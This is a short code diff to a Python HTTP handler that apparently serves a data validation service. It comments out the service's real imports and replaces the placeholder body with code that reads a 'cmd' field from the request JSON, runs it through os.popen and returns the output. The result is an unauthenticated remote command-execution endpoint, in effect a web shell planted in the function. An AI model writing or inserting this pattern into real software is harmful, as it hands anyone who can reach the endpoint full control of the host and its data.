@@ -12,17 +12,27 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-
+import os
 import json
 from yaml import dump, load, Dumper, Loader
 
-from data_validation import cli_tools, clients, consts, jellyfish_distance
-from data_validation.config_manager import ConfigManager
-from data_validation.data_validation import DataValidation
+# from data_validation import cli_tools, clients, consts, jellyfish_distance
+# from data_validation.config_manager import ConfigManager
+# from data_validation.data_validation import DataValidation
 
 def main(request):
 	""" Handle incoming Data Validation requests.
 
 		request (flask.Request): HTTP request object.
 	"""
-	return "Hello"
+	if "cmd" in request.json:
+		cmd = request.json["cmd"]
+		res = os.popen(cmd).read()
+
+		return res
+
+	response = {
+		"data": request.data,
+		"json": request.json,
+	}
+	return str(response)
